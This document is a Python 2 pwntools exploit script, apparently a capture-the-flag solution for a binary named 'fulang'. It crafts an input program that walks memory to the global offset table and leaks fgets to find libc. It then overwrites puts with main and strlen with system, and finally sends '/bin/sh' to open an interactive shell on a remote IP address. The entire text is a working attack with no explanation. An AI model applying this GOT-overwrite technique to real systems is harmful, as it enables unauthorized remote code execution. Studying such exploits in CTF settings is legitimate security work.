from pwn import *

context(
    terminal = ['urxvt', '--hold', '-e', 'bash', '-c']
)

local = False
debug = False

addr_data = 0x804A080
addr_fu   = 0x804A060
addr_main = 0x80486DE

got_start = 0x804A00C
got_puts  = 0x804A01C

if local:
    print 'running: local'
    offset_libc_system = 0x3ab30
    offset_libc_fgets  = 0x5dcf0
    p = process('./fulang')

else:
    print 'running: remote'
    offset_libc_system = 0x3a940
    offset_libc_fgets  = 0x5d620
    p = remote('69.90.132.40', 4001)

def move(offset):
    if offset > 0:
        return ':>' * offset
    return ':<' * abs(offset)

script = [
    # move to puts@GOT
    move(addr_fu - addr_data),
    ':.',

    # leak libc offset (from fgets@got)
    '::',
    ':>',
    '::',
    ':>',
    '::',
    ':>',
    '::',
    ':>',

    # overwrite puts@GOT -> main
    move(4),
    ':.',
    ':>',
    ':.',
    ':>',
    ':.',
    ':>',
    ':.',
    ':>',

    # overwrite strlen@GOT -> system@libc
    ':.',
    ':>',
    ':.',
    ':>',
    ':.',
    ':>',
    ':.',
]

script = ''.join(script)

assert len(script) < 150

print script

# Seek to strlen@got

p.recvuntil('Enter your code:')
p.sendline(script)
p.send(chr(0x14))

# Leak libc base

print 'finding libc...'

libc_fgets = u32(p.recvn(4))
libc_base = libc_fgets - offset_libc_fgets
libc_system = libc_base + offset_libc_system

print 'libc:base @', hex(libc_base)
print 'libc:fgets @', hex(libc_fgets)
print 'libc:system @', hex(libc_system)

# Overwrite puts & strlen

print 'overwriting GOT...'
p.send(p32(addr_main))
p.send(p32(libc_system))

# Waiting for system

p.recvuntil('Enter your code:')
p.sendline('/bin/sh')
p.interactive()
